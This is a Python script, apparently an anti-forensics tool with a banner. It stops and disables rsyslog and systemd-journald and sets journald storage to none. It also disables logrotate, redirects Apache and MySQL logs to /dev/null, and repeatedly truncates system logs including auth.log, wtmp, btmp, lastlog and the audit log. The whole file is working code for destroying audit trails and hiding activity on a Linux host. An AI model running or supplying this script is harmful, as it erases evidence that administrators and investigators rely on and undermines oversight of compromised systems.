

import os
import subprocess
#demo text
def print_banner():
    banner = r"""
     _              _____                     _           
    | |            / ____|                   | |          
    | |__   ___  | |  __   __ _  _ __   __ _| | __ _  ___ 
    | '_ \ / _ \ | | |_ | / _` || '__| / _` | |/ _` |/ _ \
    | | | |  __/ | |__| || (_| || |   | (_| | | (_| |  __/
    |_| |_|\___|  \_____| \__,_||_|    \__, |_|\__, |\___|
                                         __/ |   __/ |    
                                        |___/   |___/     
    """
    print(banner)

def run_command(command):
    """Executes a shell command and returns its output."""
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode != 0:
        print(f"Error: {result.stderr.strip()}")
    return result.stdout.strip()

def main():
    print_banner()

    # Stop and disable system logging services
    print("Stopping and disabling rsyslog...")
    run_command("sudo systemctl stop rsyslog")
    run_command("sudo systemctl disable rsyslog")

    print("Stopping and disabling systemd-journald...")
    run_command("sudo systemctl stop systemd-journald")
    run_command("sudo systemctl disable systemd-journald")

    # Configure systemd-journald to not persist logs
    print("Disabling persistent logging for systemd-journald...")
    run_command("sudo sed -i 's/^#*Storage=.*/Storage=none/' /etc/systemd/journald.conf")
    run_command("sudo systemctl restart systemd-journald")

    # Disable log rotation by renaming the cron job
    logrotate_path = '/etc/cron.daily/logrotate'
    if os.path.isfile(logrotate_path):
        print("Disabling logrotate cron job...")
        run_command(f"sudo mv {logrotate_path} {logrotate_path}.disabled")

    # Redirect application-specific logs to /dev/null
    # Example for Apache
    if os.path.isdir('/etc/apache2'):
        print("Redirecting Apache logs to /dev/null...")
        run_command("sudo sed -i 's|ErrorLog .*|ErrorLog /dev/null|' /etc/apache2/apache2.conf")
        run_command("sudo sed -i 's|CustomLog .*|CustomLog /dev/null combined|' /etc/apache2/apache2.conf")
        run_command("sudo systemctl restart apache2")

    # Example for MySQL
    if os.path.isdir('/etc/mysql'):
        print("Redirecting MySQL logs to /dev/null...")
        run_command("echo '[mysqld]' | sudo tee /etc/mysql/mysql.conf.d/no-log.cnf > /dev/null")
        run_command("echo 'general_log = 0' | sudo tee -a /etc/mysql/mysql.conf.d/no-log.cnf > /dev/null")
        run_command("echo 'error_log = /dev/null' | sudo tee -a /etc/mysql/mysql.conf.d/no-log.cnf > /dev/null")
        run_command("echo 'slow_query_log = 0' | sudo tee -a /etc/mysql/mysql.conf.d/no-log.cnf > /dev/null")
        run_command("sudo systemctl restart mysql")

    # Define specific log files to clear and overwrite
    log_files = [
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/kern.log",
        "/var/log/boot.log",
        "/var/log/daemon.log",
        "/var/log/faillog",
        "/var/log/dpkg.log",
        "/var/log/yum.log",
        "/var/log/apt/history.log",
        "/var/log/apt/term.log",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/var/log/mail.log",
        "/var/log/mail.err",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/mysql/error.log",
        "/var/log/audit/audit.log",
    ]

    # Overwrite each log file 10 times
    for log_file in log_files:
        if os.path.isfile(log_file):
            print(f"Overwriting {log_file} 10 times")
            for _ in range(10):
                with open(log_file, 'w') as f:
                    f.write("")  # Overwrite with an empty string
        else:
            print(f"File {log_file} not found, skipping.")

    print("All specified log files have been cleared and overwritten 10 times.")

if __name__ == "__main__":
    main()
